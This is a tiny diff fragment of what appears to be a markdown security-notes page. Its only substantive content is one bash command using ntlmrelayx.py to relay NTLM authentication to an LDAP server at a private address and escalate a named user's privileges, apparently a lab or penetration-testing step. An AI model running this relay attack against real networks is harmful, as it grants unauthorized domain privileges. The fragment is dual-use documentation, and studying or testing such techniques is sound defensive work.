@@ -15,3 +15,5 @@ updated_at: '2023-04-10T20:26:29.616322+00:00'
 ```bash
 sudo ntlmrelayx.py -t ldap://192.168.83.135 --no-wcf-server --escalate-user winrm_user_1
 ```
+
+
